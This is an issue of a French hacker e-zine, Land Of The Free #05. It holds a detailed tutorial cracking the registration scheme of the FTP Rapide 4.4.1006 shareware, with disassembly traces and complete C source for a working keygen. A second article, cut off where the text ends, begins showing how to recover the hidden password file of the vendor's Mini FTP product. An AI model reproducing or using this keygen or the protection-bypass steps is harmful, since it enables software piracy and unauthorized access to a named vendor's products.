<html>
<head>
<title>Land Of The Free #05 - sirius_black</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="stylesheet" href="fichiers/lotfree05.css" type="text/css">
<link rel="stylesheet" href="fichiers/cas.css" type="text/css">
</head>

<body bgcolor="#FFFFFF" text="#000000">
<div align="left"></div>
<table border="1" cellpadding="0" cellspacing="1" bordercolor="#000099" align="center" width="100%">
  <tr> 
    <td valign="top" bgcolor="#0066CC" class="texttitre" width="100%"> 
      <div align="center"> 
        <p class="articletitre"><u>Land Of The Free #05<br>
          </u><span class="artsurtitre">par sirius_black</span></p>
      </div>
    </td>
  </tr>
  <tr> 
    <td valign="top" class="textgras" bgcolor="#000000">Sommaire</td>
  </tr>
  <tr> 
    <td valign="top" bgcolor="#3d599b"> 
      <ol>
        <li class="menu2"><a href="#intro">Introduction</a></li>
        <li class="menu2"><a href="#keygen">Crack de FTP Rapide</a></li>
        <li class="menu2"><a href="#kiriasse">Hack de kiriasse</a></li>
        <li class="menu2"><a href="#anonymat">Tutoriel sur l'anonymat (web, IRC, 
          FTP &amp; Co)</a></li>
        <li class="menu2"><a href="#sevensynkop">Solution crackme de An-Mojeg 
          (cr&eacute;ateur du Seven SynKop Mag)</a></li>
        <li class="menu2"><a href="#hd1">Exemple concret d'une intrusion N&deg;1 
          (pris dans Hackers Digest 2)</a></li>
        <li class="menu2"><a href="#nag">Virer les Nag dans le fNaaX's crackme 
          2 (membre de ICITeam)</a></li>
        <li class="menu2"><a href="#HTP">Hack The Planet ou How To Code A Fake 
          Proxy For Fun But Not For Profit</a></li>
        <li class="menu2"><a href="#hack2">Exemple concret d'une intrusion N&deg;2 
          (pris dans Hackers Digest 2)</a><br>
        </li>
        <li class="menu2"><a href="#smash">Traduction de Come Out And Play de 
          Offspring</a><br>
        </li>
        <li class="menu2"><a href="#jB">Crackme de jB sans bouton de validation</a><br>
        </li>
        <li class="menu2"><a href="#robots">Trouver les documents confidentiels 
          sur un serveur</a><br>
        </li>
        <li class="menu2"><a href="#OS4">Niquer la sécurité par le biais de la 
          base de registre par OS4M4CKERS</a><br>
        </li>
        <li class="menu2"><a href="#conclusion">Conclusion</a><br>
        </li>
      </ol>
    </td>
  </tr>
  <tr> 
    <td valign="top" class="textgras" bgcolor="#000000"><a name="intro"></a>Introduction</td>
  </tr>
  <tr> 
    <td valign="top" class="textpetit">&nbsp;&nbsp;&nbsp;Et &ccedil;a y est, c'est 
      reparti pour un tour, quand yen a plus yen a rencor !!! Voil&agrave; fraichement 
      d&eacute;barqu&eacute; LOTFREE Num&eacute;ro 5. Mine de rien le mag a bien 
      &eacute;volu&eacute; et j'me marre lorsque je regarde les 2 premiers num&eacute;ros. 
      Tout &agrave; vraiment commenc&eacute; &agrave; partir du 3 au niveau du 
      contenu mais aussi du style...<br>
      &nbsp;&nbsp;&nbsp;5 num&eacute;ros c'est autant que le RTC Mag qui est mon 
      mag pr&eacute;f&eacute;r&eacute; pour la cat&eacute;gorie &quot;Old School&quot; 
      (on va dire &ccedil;a comme &ccedil;a. C'est pourquoi je tiens &agrave; 
      leur d&eacute;dier ce num&eacute;ro.<br>
      &nbsp;&nbsp;&nbsp;Ce num&eacute;ro est sp&eacute;cial car plut&ocirc;t orient&eacute; 
      hacking et m&ecirc;me plut&ocirc;t orient&eacute; sur la pratique. Int&eacute;ressant 
      non ? Je vous laisse juger par vous m&ecirc;me.<br>
      &nbsp;&nbsp;&nbsp;Comme d'habitude il y a les &eacute;ternels articles de 
      cracking pour pas vous d&eacute;paysager :) mais aussi un tut sur l'anonymat 
      que j'ai fait le plus complet possible.<br>
      &nbsp;&nbsp;&nbsp;Vous avez s&ucirc;rement remarqu&eacute; dans le sommaire 
      le &quot;Hack The Planet&quot;. Bah c'est un prog que j'ai cod&eacute; pour 
      d&eacute;lirer. De quoi vous faire passer pour le plus grand H4X0R de la 
      plan&egrave;te.<br>
      &nbsp;&nbsp;&nbsp;J'ai re&ccedil;u encore une fois le soutient de OS4M4CKERS 
      et je le remerci du fond du coeur :)<br>
      &nbsp;&nbsp;&nbsp;Autre chose : les couleurs !! En effet l'interface est 
      plut&ocirc;t pas mal. Il s'agit d'un feuillet de style que j'ai r&eacute;cup&eacute;r&eacute; 
      sur le site de CASPAM (un site Anti-Spam &amp; Co).<br>
      &nbsp;&nbsp;&nbsp;Sur ce bonne lecture. <a href="mailto:sirius_black@imel.org" class="menu2">sirius_black</a> 
      (nouvelle adresse mail et qui marche !!! ;)</td>
  </tr>
  <tr> 
    <td valign="top" class="textgras" bgcolor="#000000"><a name="keygen"></a>Faire 
      un keygen pour FTP Rapide</td>
  </tr>
  <tr> 
    <td valign="top"> 
      <div align="left"><u><span class="textpetit">Pr&eacute;sentation du logiciel</span></u><span class="textpetit"><br>
        On s'interesse ici &agrave; la version 4.4.1006.<br>
        </span></div>
      <span class="textpetit">FTP Rapide est d&eacute;vellop&eacute; par Jean-Claude 
      Mariotte (jcmariotte@kiriasse.fr), soci&eacute;t&eacute; Kiriasse (</span><a href="http://www.kiriasse.fr"><span class="menu2">www.kiriasse.fr</span></a><span class="textpetit">).<br>
      J'ai trouv&eacute; ce logiciel dans PC Shareware N&deg;4, un mag avec des 
      cds tout pleins de sharewares &agrave; cracker (quoique un peu trop de freewares 
      &agrave; mon gout :-)).<br>
      Ce mag est un peu vieux (novembre 2001) mais on est l&agrave; pour apprendre 
      ;-)<br>
      La pr&eacute;sentation qu'ils donnent du logiciel est la suivante :<br>
      Ce logiciel client FTP permet de t&eacute;l&eacute;charger logiciels et 
      documents depuis un serveur FTP. (nan c vrai ??)<br>
      Limit&eacute; en version non enregistr&eacute;e &agrave; ceux acceptant 
      les acc&egrave;s anonymes (login: anonymous / password: guest), il est extr&eacute;mement 
      simple &agrave; utiliser. S'il en est limit&eacute; dans ces fonctions, 
      il permet &nbsp;cependant de suivre les chargements avec des indications 
      de taille, de progression et de vitesse. Mais ses principaux attraits reposent 
      dans la recherche int&eacute;gr&eacute;e d'adresse FTP sur http://ftpfind.voila.fr 
      et surtout dans la possibilit&eacute; de cr&eacute;er des raccourcis avce 
      une ligne de commande int&eacute;grant toutes les informations pour charger 
      directement un fichier. Pratique donc pour r&eacute;cup&eacute;rer r&eacute;guli&egrave;rement 
      et d'un double-click des fichiers souvent mis &agrave; jours.<br>
      <br>
      Bon pour ce qui est de la communication avec le ftpfind de voila g pas pu 
      tester car g pas de connexion internet perso (comme moi je ne cracke pas 
      pour ma pomme ;-)<br>
      A noter aussi que le logiciel poss&egrave;de une petite musique qui tourne 
      en boucle : le canon de Pashenbel (je sais pas si &ccedil;a s'&eacute;crit 
      comme &ccedil;a), enfin pour les pas cultur&eacute;s (car la cultivation 
      c pour les patates), il s'agit de la musique de fond sur le "Je me souviens" 
      de M&eacute;n&eacute;lik. Cette musique, tr&egrave;s agr&eacute;able au 
      demerant peu devenir tr&egrave;s &eacute;nervante si vous d&eacute;buggez 
      le logiciel (entendre le meme morceau pendant une heure c saoulant) alors 
      baissez le son si vous le d&eacute;plombez !!<br>
      <br>
      Le prix de la licence est de 150F Fran&ccedil;ais, ce que personellement 
      je trouve trop cher, enfin faut dire que j'utilise la commande FTP sous 
      dos :-)<br>
      <br>
      <u>Etude du logiciel</u><br>
      Bon on fait comme d'hab, on provoque le logiciel : on le d&eacute;marre, 
      il nous met "version non enregistr&eacute;" (ou un truc du style) alors 
      nous on est poli, on clique sur "s'enregistrer", il nous demande un username 
      (g pris niicolas ou sirius_black... selon les essais que g fait) puis ensuite 
      il nous demande le password (le tout dans des InputBox diff&eacute;rentes) 
      la j'entre sirius01 ou 666fuckyou...<br>
      <br>
      Apparemment le logiciel n'aime pas : invalid name...<br>
      On note sa J&eacute;r&eacute;miade et on d&eacute;sassemble le prog avec 
      Win32Dasm (version 8.93 chez moi). On clique sur String Data References 
      et l&agrave; : Horeur !!! Ya que dalle sinon "VB5".<br>
      Faut pas d&eacute;moraliser parce que comme a dit intruder mexelite97 dans 
      son tut "happy vb5 cracking" : "<font color="#33cc00">IF</font> VISUAL BASIC 
      <font color="#33cc00">THEN</font> CRACKED AT ONCE".<br>
      En effet les progs vb &eacute;taient de v&eacute;ritables merdes dans les 
      versions 1, 2 et 3 du langage visual basic. Because il suffisait de poss&eacute;der 
      le Dodi's VB Discompiler et on se retrouvait avec la source du programme... 
      LoL !!! Avec le VB5 ca va &ecirc;tre plus dur !!!<br>
      <br>
      Quand g commence a d&eacute;plomb&eacute; le prog j'avais pas encore Smartcheck 
      donc j'ai utilis&eacute; le VBREF de la team Execution Council. Le principe 
      ? Vous enregistrer la decompilation dans un .alf avec w32dasm puis avec 
      vbref vous g&eacute;n&eacute;rez un .vbr avec le prog et le .alf et vous 
      obtenez &agrave; peu pr&egrave;s ce que donne w32 mais avec les strings. 
      Mais la navigation est disons... plus archaique avec vbref. Quoique il en 
      soit on trouve les strings qui nous interesse dans vbref :</span><br>
      <p align="left"> 
        <center>
          <img src="fichiers/vbrefstr.jpg" width="321" height="324"> 
        </center>
      </p>
      <div align="left"><span class="textpetit">On clique sur "Le nom d'utilisateur 
        et/ou la clef..." (juste au dessus de Username and/or key are not valid.) 
        Si on clique plusieurs fois on voit que ya qu'une occurence donc c'est 
        cool.<br>
        En gros on tombe sur :</span><br>
        <pre>Nom d'utilisateur (User name)<br>:0042C897&nbsp;mov dword ptr [ebp+FFFFF38], 0040B1F0<br><br>Veuillez saisir votre nom d'utilisateur de Ftp Rapide.<br>:0042C8EA&nbsp;push 0040B11C<br><br>MSVBVM60.rtcInputBox, Ord:0254h username en 00471fc8 (adresse dans eax) <font color="#3366ff">//premi&egrave;re input box (username)</font><br>:0042C973&nbsp;Call dword ptr [004010A4]<br><br>MSVBVM60.__vbaStrCmp, Ord:0000h <font color="#3366ff">// hehe</font><br>:0042C9E4&nbsp;Call dword ptr [004010EC]<br><br>Clef pour (Key for) Ftp Rapide<br>:0042CA58&nbsp;mov dword ptr [ebp+FFFFFF38], 0040B314<br><br>Veuillez saisir votre clef (mot de passe pour Ftp Rapide).<br>:0042CAA7&nbsp;push 0040B230<br><br>MSVBVM60.rtcInputBox, Ord:0254h pass en00468d88 <font color="#3366ff">//seconde input box (password)</font><br>:0042CB30&nbsp;Call dword ptr [004010A4]<br><br>MSVBVM60.__vbaStrCmp, Ord:0000h <font color="#3366ff">//hinhin</font><br>:0042CBA1&nbsp;Call dword ptr [004010EC]<br>		test eax, eax<br>		je 0042D0E9 <font color="#3366ff">&lt;- celui la ?</font><br>:0042CBAF&nbsp;lea ecx, dword ptr [ebp-1C] -&gt; adress password<br>:0042CBB2&nbsp;lea edx, dword ptr [ebp-28] -&gt; adresse login<br>:0042CBB5&nbsp;push ecx<br>:0042CBB6&nbsp;push edx<br>&nbsp;&nbsp;...<br>:0042CBB7&nbsp;call 0041FBB0<br>		test ax, ax<br>		jne 0042CE61 <font color="#3366ff">&lt;- vers Valid username and key.</font>(tiens c'est celui l&agrave;)<br>:0042CBC5&nbsp;call 0041EE30<br><br>:0042CBE5&nbsp;Bad Boy</pre>
        <span class="textpetit">Alors comment ca marche ? Ben on debugge le prog 
        avec w32 sur cette zone avec les options sur les apis et on regarde :<br>
        Il commence par cr&eacute;er une inputbox qui demande le user name. Une 
        fois rentr&eacute;, le prog compare avec la chaine vide (v&eacute;rifie 
        que l'on a tap&eacute; kekchose). Puis il fait pareil avec la cl&eacute;.<br>
        Ca devient donc interessant &agrave; partir de :0042CBAF. Si on d&eacute;bugge 
        on verra rien du tout dans la fen&ecirc;tre de documentaion API et pour 
        cause le call 0041FBB0 est une fonction cr&eacute;e le concepteur. En 
        fait cette fonction utilise des variables locales qui sont stock&eacute;es 
        en ebp-1C et ebp-28. Et comme par hazard ya le username et la key !!<br>
        Ca fait un tas de calcul puis apr&egrave;s ca regarde si ax vaut z&eacute;ro. 
        Si c'est le cas les codes ne sont pas bons et on poursuit sinon c'est 
        que c'est bon et on va en 0042CE61.<br>
        <br>
        J'en voient d&eacute;j&agrave; qui disent : ca y est il va mettre un jmp 
        0042CE61 apr&egrave;s la routine. Ben non !! Parce que le prog v&eacute;rifie 
        les cl&eacute;s (stock&eacute;es dans la base de registre) au d&eacute;marrage 
        c'est pour ca qu'il nous affiche que l'on est pas enregistr&eacute; au 
        d&eacute;part. Il se peut que ce soit la meme routine utilis&eacute; au 
        d&eacute;marrage et dans les box, dans ce cas il faut faire en sorte qu'elle 
        renvoie toujours 1.<br>
        Mais j'ai pas regarde (d'ailleurs faudra que je regarde). Moi je pr&eacute;f&egrave;re 
        ne pas toucher au prog et faire un keygen. Enfin j'ai quand meme essay&eacute; 
        de le reverser pour qu'il crache la cl&eacute; correspondante au username 
        qu'on lui file. Ca marche la premi&egrave;re fois que la fonction est 
        appele mais apres c'est du nimportenawak (la pile n'est pas remise comme 
        il faudrait, et puis le code n'est pas facilement d&eacute;tournable dans 
        notre cas).<br>
        <br>
        En d&eacute;buggant (toujours sans Smartcheck) on voit qu'il commence 
        par :</span><br>
        <pre>__vbaStrCopy(57f18b56,8dec8b55,0,0,0,0,0,0)=004566a4-&gt;"RAPIDFTP"<font color="#3366ff">// met RAPIDFTP en m&eacute;moire et dan eax</font><br>API Address=0041FC71, API Return Address=0041FC77<br><br>__vbaStrCmp("",004566ec-&gt;"sirius01",6602465b,66025324,0,0,0,0)=1 <font color="#3366ff">// on v&eacute;rifie que une cl&eacute; a &eacute;t&eacute; entr&eacute;e</font><br>API Address=0041FC88, API Return Address=0041FC8A<br><br>__vbaStrCmp("",00468ae4-&gt;"niicolas",6602465b,66025324,0,0,0,0)=1 <font color="#3366ff">// on v&eacute;rifie qu'un username a &eacute;t&eacute; entr&eacute;</font><br>API Address=0041FC9D, API Return Address=0041FC9F<br><br>__vbaStrCat(00468ae4-&gt;"niicolas",004086dc-&gt;"KIRIASSE",6602465b,66025324,0,0,0,0)=00468d2c-&gt;"KIRIASSEniicolas"<br><font color="#3366ff">//concat&eacute;nation</font><br>API Address=0041FCB5, API Return Address=0041FCBB<br><br>__vbaStrMove(6602465b,66025324,0,0,0,0,0,0)=00468d2c-&gt;"KIRIASSEniicolas" et eax <font color="#3366ff">//mise en m&eacute;moire</font><br>API Address=0041FCC6, API Return Address=0041FCC8<br><br>rtcRightCharBstr(00468ae4-&gt;"niicolas",8,6602465b,66025324,0,0,0,0)=00468d88-&gt;"niicolas"<br><font color="#3366ff">//on prend les 8 derniers car du login (dans mon cas yen a deja 8)</font><br>API Address=0041FCCD, API Return Address=0041FCD3<br><br>__vbaStrMove(6602465b,66025324,0,0,0,0,0,0)=00468d88-&gt;"niicolas" <font color="#3366ff">//mise en m&eacute;moire</font><br>API Address=0041FCD8, API Return Address=0041FCDA<br><br>rtcUpperCaseBstr(00468d88-&gt;"niicolas",6602465b,66025324,0,0,0,0,0)=00468cb8-&gt;"NIICOLAS" <font color="#3366ff">//mise en majuscule</font><br>API Address=0041FCDB, API Return Address=0041FCE1<br><br>__vbaStrMove(6602465b,66025324,0,0,0,0,0,0)=00468cb8-&gt;"NIICOLAS" <font color="#3366ff">//mise en m&eacute;moire</font><br>API Address=0041FCE6, API Return Address=0041FCE8<br><br>__vbaFreeStr(6602465b,66025324,0,0,0,0,0,0)=20 <font color="#3366ff">//lib&eacute;ration de l'espace</font><br>API Address=0041FCEB, API Return Address=0041FCF1</pre>
        Ouais je sais j'ai mis un peu trop de d&eacute;tail, j'en met un peu moins 
        maintenant :<br>
        <pre>           
<font color="#000000">rtcMidCharBstr(00468cb8-&gt;"NIICOLAS",1,0067e2f0,6602465b,66025324,0,0,0)=00468d88-&gt;"N"</font>
<font color="#3366ff">//on prend&nbsp;le premier caract&egrave;re a partir du d&eacute;but</font>
API Address=0041FD4B, API Return Address=0041FD51
__vbaStrMove(6602465b,6602465b,66025324,0,0,0,0,0)=00468d88-&gt;"N" <font color="#3366FF">//</font><font color="#3366ff">mise en m&eacute;moire</font>
API Address=0041FD56, API Return Address=0041FD5C
__vbaStrCopy(6602465b,66025324,0,0,0,0,0,0)=00471fec-&gt;"N" <font color="#3366ff">//mise en m&eacute;moire</font>
API Address=0041FD66, API Return Address=0041FD6C</pre>
        <p><span class="textpetit">Ca recommence ensuite avec les 7 lettres qui 
          restent de notre login.<br>
          Puis il fait la meme chose (mise en memoire de lettres) avec la chaine 
          de caract&egrave;res "RAPIDFTP".<br>
          Une fois cette partie effectu&eacute;e il prend la premi&egrave;re lettre 
          de RAPIDFTP, puis la compare au lettres de l'alphabet mises dans un 
          ordre sp&eacute;cial. Quand il l'a trouv&eacute; il s'arr&ecirc;te de 
          comparer et calcule en nombre. Ensuite il passe &agrave; la lettre suivante 
          etcetera<br>
          Au d&eacute;part j'avais class&eacute; les lettres de cette alphabet 
          sp&eacute;cial en fonction de leur proximit&eacute; dans la m&eacute;moire, 
          j'avais obtenu :</span><br>
        </p>
        <pre>par zone de chaine<br>1,2,3,4,5,6,7,8,9,0,A,K,U,B,L,V,C,<br>M,W,<br>D,N,X,<br>E,O,Y,F,<br>P,<br>Z,G,Q,H,R,I,S,J,T,#,$</pre>
        <span class="textpetit">ce qui ne m'avait pas vraiment arrang&eacute; 
        !! Alors je me suis dit : chaque fois qu'une lettre trouve sa correspondance, 
        le programme en d&eacute;duit une valeur. Il faut donc que je classe par 
        "cons&eacute;quence". En effet certaines lettres renvoient le m&ecirc;me 
        nombre. J'ai donc fait un regroupement par "jump" suivant les lettres 
        et j'ai obtenu :</span><br>
        <pre>par saut<br>1,2,3,4,5,6,7,8,9,0, -&gt; 00420332<br>A,K,U,			004202f0 -&gt;"1"<br>B,L,V,			004202ab<br>C,M,W,			00420266<br>D,N,X,			00420221 -&gt;"4"<br>E,O,Y,			004201dc<br>F,P,Z,			00420197 -&gt;"6"<br>G,Q,			00420152<br>H,R,			0042010d -&gt;"8"<br>I,S,			004200c8 -&gt;"9"<br>J,			00420083<br>T,			004203a8 -&gt;"0"<br>#,<br>$</pre>
        <span class="textpetit">Voil&agrave; qui est plus lisible !! Premier probl&egrave;me 
        que l'on remarque dans le programme : un calcul inutile !!! A quoi bon 
        calculer un code &agrave; partir d'une chaine qui est toujours la m&ecirc;me 
        :(<br>
        A moins que... a moins que cette fonction soit utilis&eacute; dans d'autres 
        programmes du m&ecirc;me d&eacute;veloppeur et dans ce cas si on arrive 
        &agrave; faire un keygen pour FTP Rapide, il suffira de changer la chaine 
        "magique" (RAPIDFTP) par TRUCFTP si on faire un keygen pour TrucFTP !! 
        On verra ca quand j'aurais fini le tut :-)<br>
        <br>
        Reprennons, RAPIDFTP donne en nombres : 81694606.<br>
        Voyons ce qu'il fait avec notre name</span><br>
        <pre>rtcR8ValFromBstr(471eb4-&gt;"8")=10 <font color="#3366ff">//toujours pris dans w32dasm puis modifier pour la lecture</font><br><br>rtcAnsiValueBstr(00468de4-&gt;"N",,,,,,,)=4e <font color="#3366ff">// transformation en ascii de la premi&egrave;re lettre</font><br><br>__vbaFpI2(6602465b,66025324,0,0,40538000,4e,0067e2b0,bff6a26e)=56 <font color="#3366ff">// 4E + 8 = 56</font><br><br>rtcBstrFromAnsi(56,6602465b,66025324,0,0,40538000,4e,0067e2b0)=00471f68-&gt;"V" <font color="#3366ff">// valeur de "V" ? 56 evidemment</font><br>API Address=004205DA, API Return Address=004205E0</pre>
        <span class="textpetit">Il fait donc une addition avec toutes les lettres. 
        Mais si on calcule le serial comme ca, ca ne marchera pas... Il fait des 
        calculs en plus. Alors je suis pass&eacute; sur smartcheck pour la premi&egrave;re 
        fois et la vraiment &ccedil;a vaut le coup !!<br>
        Voici quelques images de quoi faire la config de smartcheck (si c'est 
        pas d&eacute;j&agrave; fait). </span><br>
        <img src="fichiers/config1.jpg" width="466" height="377"> <img src="fichiers/config2.jpg" width="463" height="376"><br>
        <span class="textpetit">Au lancement de startcheck je vous conseille d'avoir 
        le bouton avec le carre bleu enfonc&eacute; (pas trop de d&eacute;tail). 
        Puis vous loaddez FTP Rapide, vous entrez le username et la cl&eacute; 
        puis quand il affiche "username and/or key not valid" vous cliquez pas 
        !!! Vous cliquez sur stop dans smartcheck. Ainsi on aura le minimum de 
        code utile. Vous vous retrouvez devant :</span><br>
        <center>
          <img src="fichiers/screen1.jpg" width="467" height="351"> 
        </center>
        <span class="textpetit"><br>
        Il faut alors d&eacute;velopper tous les derniers trucs. On commence par 
        le load. On descent tout en bas, ya un "_Click". On le d&eacute;veloppe 
        puis on recommence avec AniGIF1_Click (toujours en bas). Ne d&eacute;veloppez 
        pas la message box apr&egrave;s (message d'erreur). Vouz voyez :</span><br>
        <center>
          <img src="fichiers/screen2.jpg" width="458" height="590"> 
        </center>
        <br>
        <span class="textpetit">On a un peu de mal car Smartcheck met des d&eacute;cimaux 
        et non de l'hexa : "V" vaut 86. On peut se rep&eacute;rer avec les marteaux. 
        "niicolas" donne donc "VJOLSRAY". Mais c'est pas fini. On clique sur la 
        bulle jaune dans le menu de SC et on a les appels API.</span><br>
        <center>
          <img src="fichiers/screen3.jpg" width="369" height="590"> 
        </center>
      </div>
      <span class="textpetit">On remarque le strcmp final dans cette fonction 
      locale : strcmp("666fuck","VJ$LSRAY");<br>
      Ben &ccedil;a alors !! Notre 'O' se transforme en '$' !! On regarde avec 
      notre 'S' (derni&egrave;re lettre) : il prend la lettre et l'additionne 
      avec le dernier chiffre (6) ce qui donne 'Y', normal.<br>
      Mais apr&egrave;s ya un tas de comparaison : avec les chiffres puis avec 
      'O'. On comprend qu'il traite des cas particuliers. Pour le 'O' voil&agrave; 
      ce qu'il se passe.</span><br>
      <center>
        <img src="fichiers/ohoh.jpg" width="393" height="83"> 
      </center>
      <br>
      <span class="textpetit">Pas de calcul, juste parce que c'est un 'O' on le 
      remplace par '$'. L'exp&eacute;rience nous montreras que pour les carat&egrave;res 
      non lettres capitales, il les remplace par les chiffres du magic code+1.<br>
      Si on rentre 01234567 il renvoie 927#4606 (je rapelle que le magic code 
      est 81694606). On note que le 9 est remplac&eacute; par '#'.</span><br>
      <pre><br>R&eacute;capitulatif :<br>il prend le nom 'niicolas'<br>il le met en majuscules 'NIICOLAS'<br>il fait l'addition avec&nbsp;'81694606'<br>ce qui nous donne       'VJOLSRAY'<br>On enleve les 'o' etc   'VJ$LSRAY'<br></pre>
      <span class="textpetit">Voil&agrave; !!<br>
      D'autres exemples : sirius_black donne 9T7KPGCQ<br>
      57463201 donne 927#5717<br>
      Un petit keygen. Allez on le fait en C :<br>
      </span> 
      <pre>/* Keygen by sirius_black<br>+  FTP Rapide v4.4.1006<br>* Pure 3133t3 c0d3Z<br>+ F34R m3 !!!<br>+ Yah !!!<br>+ Pr0uT !!<br>+ Sex, Punk &amp; CrackZ<br>+ Enjoy<br>*/
<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;
<br>void calcul(char *x){<br>  int i;<br>  char *y=x;<br>  for (i=0;i&lt;strlen(x);i++){<br>    if (*y&lt;123 &amp;&amp; *y&gt;96)*y=(char)((*y)-32);<br>    y++;<br>  }<br>}
<br>int is_alpha(char *y){<br>  if (*y&gt;64 &amp;&amp; *y&lt;91)return 1;<br>  else return 0;<br>}
<br>void calcul2(char *x){<br>  char *y=x;<br>  if (is_alpha(y) &amp;&amp; (*y)+8&lt;91)*y=(*y)+8;<br>  else *y='9';<br>  y++;<br>  if (is_alpha(y) &amp;&amp; (*y)+1&lt;91)*y=(*y)+1;<br>  else *y='2';<br>  y++;<br>  if (is_alpha(y) &amp;&amp; (*y)+6&lt;91)*y=(*y)+6;<br>  else *y='7';<br>  y++;<br>  if (is_alpha(y) &amp;&amp; (*y)+9&lt;91)*y=(*y)+9;<br>  else *y='#';<br>  y++;<br>  if (is_alpha(y) &amp;&amp; (*y)+4&lt;91)*y=(*y)+4;<br>  else *y='5';<br>  y++;<br>  if (is_alpha(y) &amp;&amp; (*y)+6&lt;91)*y=(*y)+6;<br>  else *y='7';<br>  y++;<br>  if (!is_alpha(y))*y='1';<br>  y++;<br>  if (is_alpha(y) &amp;&amp; (*y)+6&lt;91)*y=(*y)+6;<br>  else *y='7';<br>}
<br>void fuck_hOokers(char *x){<br>  int i;<br>  char *y=x;<br>  for (i=0;i&lt;8;i++){<br>    if (*y=='O')*y='$';<br>    y++;<br>  }<br>}
<br>int main()<br>{<br>  int taille;<br>  char * username;<br>  int i;<br>  username=malloc(16);<br>  printf("Crack de FTP Rapide 4.4.1006\n");<br>  printf("par sirius_black\n");<br>  printf("\nEntrez votre username (pas d\'espaces) : ");<br>  scanf("%s",username);<br>  while(strlen(username)&lt;8){<br>    printf("\nEntrez votre username (au moins 8 caracteres) : ");<br>    scanf("%s",username);<br>  }<br>  calcul(username);<br>  taille=strlen(username)-8;<br>  for(i=0;i&lt;taille;i++)username++;<br>  calcul2(username);<br>  fuck_hOokers(username);<br>  *(username+8)='\0';<br>  printf("Votre serial est :\n%s\n",username);<br>  free(username);<br>  system("PAUSE");<br>  return 0;<br>}</pre>
    </td>
  </tr>
  <tr> 
    <td height="21" valign="top" class="textgras" bgcolor="#000000"><a name="kiriasse"></a>Le 
      hack de Kiriasse</td>
  </tr>
  <tr> 
    <td height="179" valign="top" class="textpetit"> 
      <p>Voici un exemple de hack tr&egrave;s particulier qui je suis s&ucirc;r 
        va vous plaire. Je vous recommande de lire d'abord l'article pr&eacute;c&eacute;dent 
        car les deux articles appartiennent &agrave; une seule et m&ecirc;me histoire.<br>
        <br>
        Afin de savoir si les autres logiciels de chez Kiriasse utilisaient des 
        protections similaires, je me suis attaqu&eacute; &agrave; Mini Ftp 4.7 
        (ya en grande partie du cracking dans l'article mais en fin de compte 
        on hack :). Voici la description donn&eacute;e par le cr&eacute;ateur 
        :<br>
        <br>
        <u>Version de d&eacute;monstration :</u> cette version de Mini FTP est 
        gratuite et compl&egrave;te. Elle permet &agrave; titre d'exemple de t&eacute;l&eacute;charger, 
        apr&egrave;s saisie d'un mot de passe, les programmes d'installation de 
        tous les logiciels pr&eacute;sent&eacute;s sur le site Kiriasse Logiciels.<br>
        <br>
        <u>Version personnalis&eacute;e :</u> sur ce mod&egrave;le, je vous propose 
        de d&eacute;velopper pour vous un ou plusieurs MiniFTP personnalis&eacute;s 
        (adapt&eacute;s &agrave; votre cas personnel) qui permettront &agrave; 
        toute personne &agrave; qui vous aurez communiqu&eacute; un mot de passe 
        de t&eacute;l&eacute;charger des fichiers de votre choix, plac&eacute;s 
        par vos soins sur un serveur FTP, &agrave; une adresse connue de vous 
        seul. <br>
        <br>
        Et il rajoute les infos suivantes :<br>
        La version de d&eacute;monstration permet, &agrave; titre d'exemple, de 
        t&eacute;l&eacute;charger les fichiers zip contenant les programmes d'installation 
        de mes logiciels et le mot de passe &agrave; saisir (qui est incorpor&eacute; 
        dans un certain fichier F plac&eacute; sur Internet) est &quot;kiriasse&quot; 
        : pour cette version de d&eacute;monstration, l'emplacement de ces fichiers 
        sur Internet (et le mot de passe) ne sont donc &eacute;videmment un secret 
        pour personne. <br>
        Pour imaginer ce que peut &ecirc;tre une version personnalis&eacute;e, 
        il faut donc (en pens&eacute;e) &laquo; faire comme si &raquo; l'on ignorait 
        l'emplacement des fichiers &agrave; t&eacute;l&eacute;charger. La question 
        &agrave; se poser est alors : &laquo; Peut-on, sans conna&icirc;tre aucun 
        mot de passe, acc&eacute;der au t&eacute;l&eacute;chargement des fichiers 
        ? &raquo;. Je pr&eacute;tends que la r&eacute;ponse est NON, pour 99% 
        des personnes qui utilisent un ordinateur. Mais je ne suis pas na&iuml;f 
        et je n'ignore pas que mon logiciel (qui ne co&ucirc;te que 15,24 &euro;) 
        n'assure pas une s&eacute;curit&eacute; absolue : si vous &ecirc;tes l'un 
        des responsables des Renseignements G&eacute;n&eacute;raux ou haut fonctionnaire 
        au minist&egrave;re de la D&eacute;fense, je ne vous conseille donc pas, 
        dans l'exercice de vos fonctions, d'utiliser MiniFTP ! <br>
        A noter aussi que je place, dans les r&eacute;pertoires concern&eacute;s 
        du serveur FTP, un fichier index.html, ce qui a pour effet d'interdire 
        l'affichage, par un navigateur WEB, de la liste des fichiers contenus 
        dans ces r&eacute;pertoires. <br>
        <br>
        Donc le premier truc que je me suis dit c'est qu'il fallait que je r&eacute;cup&egrave;re 
        l'emplacement de ce fichier F.<br>
        On proc&egrave;de comme d'habitude : lancement du logiciel et recherche 
        de la phrase qui va nous servir de point de rep&egrave;re. Une fois lanc&eacute; 
        on choisit un fichier &agrave; t&eacute;l&eacute;charger parmis ceux propos&eacute;s 
        (j'ai pris kiriasse.hlp). On clique sur t&eacute;l&eacute;charger et une 
        boite de dialogue apparait disant : &quot;Veuillez taper votre code d'acc&egrave;s 
        (8 caract&egrave;res). Pour cette version de d&eacute;monstration, le 
        code d'acc&egrave;s est le mot &quot;kiriasse&quot; (en lettres minuscules)&quot;.<br>
        <br>
        Cette fois on passe direct sous smartcheck (MiniFtp est cod&eacute; en 
        VB5 aussi). Et on d&eacute;vellope le dernier &quot;_Click&quot; que l'on 
        peut d&eacute;velloper. On tombe tout de suite sur :<br>
        InputBox(&quot;Veuillez taper...&quot;); qui r&eacute;cup&egrave;re le 
        code, en l'occurence kiriasse.<br>
        Len(&quot;kiriasse&quot;); qui renvoie 8 (v&eacute;rification simple).<br>
        Puis apr&egrave;s ya un InternetOpenA et un InternetOpenUrlA tous les 
        deux d&eacute;vellopables. On trouve rien de passionant dans le premier. 
        En revanche le second a pour argument &quot;http://www.kiriasse.fr/zip/kiriasse.kir&quot;. 
        Alors la on ferme tout, on &eacute;taint son PC et on va se coucher. NON 
        !! Je d&eacute;conne !!! Hacking rules !!!<br>
        <br>
        On tape l'url dans son navigateur pr&eacute;f&eacute;r&eacute; (et plein 
        de bug s'il sagit de Internet Explorer). Et il nous affiche :<br>
        azertyui000208<br>
